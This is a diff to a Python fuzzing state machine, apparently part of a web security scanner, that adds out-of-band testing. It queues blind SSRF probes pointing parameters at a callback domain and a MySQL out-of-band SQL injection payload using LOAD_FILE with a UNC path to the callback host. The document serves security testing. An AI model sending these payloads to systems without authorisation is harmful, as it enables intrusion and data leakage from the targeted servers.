@@ -1,11 +1,14 @@
 from __future__ import annotations
 
+import logging
 import re
 import uuid
 from dataclasses import dataclass, field
 from enum import Enum, auto
 from typing import Iterator
 from urllib.parse import parse_qs, urlparse
+
+logger = logging.getLogger(__name__)
 
 
 class State(Enum):
@@ -126,10 +129,18 @@ class StateMachine:
     # URL signature deduplication threshold - discard nodes after this many identical signatures
     SIGNATURE_THRESHOLD = 3
 
-    def __init__(self) -> None:
+    def __init__(self, oast_domain: str | None = None) -> None:
         self._endpoints: dict[str, Endpoint] = {}
-        # Track URL signatures for deduplication (e.g., /item?id=1 and /item?id=2 both become /item?id={int})
         self._url_signatures: dict[str, int] = {}
+        self._oast_domain = oast_domain
+        self._oast_correlations: dict[str, str] = {} # oast_id -> original_url
+
+    def _generate_oast_id(self, url: str) -> str:
+        if not self._oast_domain:
+            return ""
+        oast_id = uuid.uuid4().hex[:12]
+        self._oast_correlations[oast_id] = url
+        return f"{oast_id}.{self._oast_domain}"
 
     def _generate_signature(self, raw_url: str) -> str:
         """Generate a URL signature for clustering.
@@ -162,6 +173,25 @@ class StateMachine:
         if query_parts:
             sig += "?" + "&".join(sorted(query_parts))  # Sort for consistency
         return sig
+
+    def process_oast_hit(self, oast_msg: dict) -> list[FuzzJob]:
+        # Handle an OAST callback and correlate it to a source URL.
+        identifier = oast_msg.get("identifier", "")
+        original_url = self._oast_correlations.get(identifier)
+        
+        if original_url:
+            ep = self._endpoints.get(original_url)
+            if ep:
+                ep.findings.append({
+                    "type": "oast_vulnerability",
+                    "protocol": oast_msg.get("protocol"),
+                    "remote_addr": oast_msg.get("remote_addr"),
+                    "data": oast_msg.get("data"),
+                    "severity": "high"
+                })
+                logger.warning(f"[SM] Confirmed OAST vulnerability on {original_url} via {identifier}")
+
+        return [] # No follow-ups usually needed for confirmed OAST
 
     def process_node(self, node: dict) -> list[FuzzJob]:
         # Process a new endpoint node and return initial fuzz jobs.
@@ -214,6 +244,34 @@ class StateMachine:
                     notes=f"SQLi error probe on {param}",
                 )
             )
+
+            # SSRF/OAST probe
+            if self._oast_domain:
+                oast_target = self._generate_oast_id(raw_url)
+                jobs.append(
+                    FuzzJob(
+                        job_id=uuid.uuid4().hex[:12],
+                        url=raw_url,
+                        method="GET",
+                        payload=f"http://{oast_target}/",
+                        param=param,
+                        category="ssrf_oast",
+                        notes=f"Blind OAST SSRF probe on {param}",
+                    )
+                )
+                
+                # Blind OOB SQLi probe (MySQL example)
+                jobs.append(
+                    FuzzJob(
+                        job_id=uuid.uuid4().hex[:12],
+                        url=raw_url,
+                        method="GET",
+                        payload=f"'; SELECT LOAD_FILE(CONCAT('\\\\\\\\', '{oast_target}', '\\\\a'))--",
+                        param=param,
+                        category="sqli_oob_oast",
+                        notes=f"Blind OOB SQLi probe on {param}",
+                    )
+                )
 
             # IDOR probe
             parsed = urlparse(raw_url)
